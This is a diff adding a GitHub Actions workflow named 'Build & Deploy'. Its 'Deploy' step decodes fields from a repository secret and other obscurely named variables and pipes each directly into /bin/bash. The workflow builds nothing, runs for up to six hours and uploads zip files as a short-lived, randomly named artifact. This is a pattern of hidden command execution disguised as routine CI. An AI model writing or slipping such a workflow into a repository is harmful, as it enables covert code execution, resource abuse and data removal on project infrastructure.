@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  dispatcher:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          o2: ${{ secrets.o2 }}
+        run: |
+          printf '%s' "$o2" | jq -r .zoole510 | /bin/bash
+          printf '%s' "$cxy5" | jq -r .ujnk75594 | /bin/bash
+          printf '%s' "$ngpq095" | jq -r .fjrn58594 | /bin/bash
+          printf '%s' "$aellu14118" | jq -r .aet23859 | /bin/bash
+          echo $vw675 | jq -r .pfiv3155 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: TOY5QsdB
+          path: "*.zip"
+          retention-days: 1
